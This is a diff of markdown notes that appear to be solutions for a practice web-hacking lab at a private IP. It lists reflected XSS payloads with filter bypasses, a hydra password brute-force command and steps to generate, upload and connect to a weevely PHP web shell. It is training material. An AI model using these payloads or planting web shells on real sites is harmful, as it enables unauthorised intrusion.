@@ -88,18 +88,18 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt
 ### XSS
 | excercise | solution |
 |-----------|----------|
-| example&nbsp;1 | http://10.0.2.4/xss/example1.php?name=%3Cscript%3Ealert(1)%3C%2fscript%3E |
-| example&nbsp;2 | http://10.0.2.4/xss/example2.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
-| example&nbsp;3 | http://10.0.2.4/xss/example3.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
-| example&nbsp;4 | http://10.0.2.4/xss/example4.php?name=<img src=xxx onerror=alert(1)> |
-| example&nbsp;5 | http://10.0.2.4/xss/example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> |
-| example&nbsp;6 | http://10.0.2.4/xss/example6.php?name=hacker";alert(1)%2f%2f |
-| example&nbsp;7 | http://10.0.2.4/xss/example7.php?name=hacker';alert(1)%2f%2f |
-| example&nbsp;8 | http://10.0.2.4/xss/example8.php/"><script>alert(1)</script> |
-| example&nbsp;8 | http://10.0.2.4/xss/example9.php/#<script>alert(1)</script> |
+| example&nbsp;1 | example1.php?name=%3Cscript%3Ealert(1)%3C%2fscript%3E |
+| example&nbsp;2 | example2.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
+| example&nbsp;3 | example3.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
+| example&nbsp;4 | example4.php?name=<img src=xxx onerror=alert(1)> |
+| example&nbsp;5 | example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> |
+| example&nbsp;6 | example6.php?name=hacker";alert(1)%2f%2f |
+| example&nbsp;7 | example7.php?name=hacker';alert(1)%2f%2f |
+| example&nbsp;8 | example8.php/"><script>alert(1)</script> |
+| example&nbsp;8 | example9.php/#<script>alert(1)</script> |
 
-### Backdoor
-## weevely
+## Backdoor
+### weevely
  1. weevely generate 1234 /root/hack.php
  2. upload file
  3. weevely http://.../upload/hack.php 123
